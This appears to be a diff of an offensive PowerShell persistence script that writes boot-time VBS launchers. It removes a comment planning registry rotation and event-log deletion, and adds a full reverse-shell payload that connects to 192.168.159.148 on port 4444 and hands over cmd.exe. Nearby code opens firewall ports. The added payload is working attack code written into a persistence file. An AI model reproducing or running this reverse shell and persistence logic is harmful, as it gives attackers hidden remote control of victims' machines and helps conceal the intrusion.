@@ -19,12 +19,6 @@
 	http://webreference.com/programming/HTA/index.html
 	help page for HTA
 	http://www.w3.org/TR/html5/dom.html#script-supporting-elements-2
-
-	==============
-	deeper persistence
-	--------------------
-	each time the script is run at boot time randomly choose a location from $env list and update the registry entry 
-	also delete old location if they haven't been erased by the user and also remove any event logs that might exist
 #>
 
 
@@ -121,7 +115,10 @@ command = "powershell.exe -nologo -command C:\Users\ADMINI~1\AppData\Local\Temp\
 '@ | Out-File $vbsStartVBS -Encoding oem
 
 @'
-start-process notepad
+function Get-ReverseShellClient {
+	if ($client.Connected -eq $true) {$client.Close()}; if ($process.ExitCode -ne $null) {$process.Close()}; exit; };$address = '192.168.159.148'; $port = '4444';$client = New-Object system.net.sockets.tcpclient; $client.connect($address,$port) ;$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize ;$process = New-Object System.Diagnostics.Process  ;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe' ;$process.StartInfo.RedirectStandardInput = 1 ;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0 ;$process.Start() ;$inputstream = $process.StandardInput ;$outputstream = $process.StandardOutput ;Start-Sleep 1 ;$encoding = new-object System.Text.AsciiEncoding  ;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length) ;$out = $null; $done = $false; $testing = 0; ;while (-not $done) {if ($client.Connected -ne $true) {cleanup}  ;$pos = 0; $i = 1;  while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos); $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}  ;if ($pos -gt 0){ $string = $encoding.GetString($networkbuffer,0,$pos);  $inputstream.write($string); start-sleep 1; if ($process.ExitCode -ne $null) {ReverseShellClean} else { $out = $encoding.GetString($outputstream.Read()); while($outputstream.Peek() -ne -1){; $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};  $stream.Write($encoding.GetBytes($out),0,$out.length); $out = $null; $string = $null}} else {ReverseShellClean}
+}
+	Get-ReverseShellClient
 '@ | Out-File $getPersistence -Encoding oem
 
 <#
@@ -176,6 +173,7 @@ function Get-OpenPorts {
 	$profile=$fwMgr.LocalPolicy.CurrentProfile
 	$profile.GloballyOpenPorts.Add($port)
 }
+
 #############################################
 ###           end function sauce          ###
 
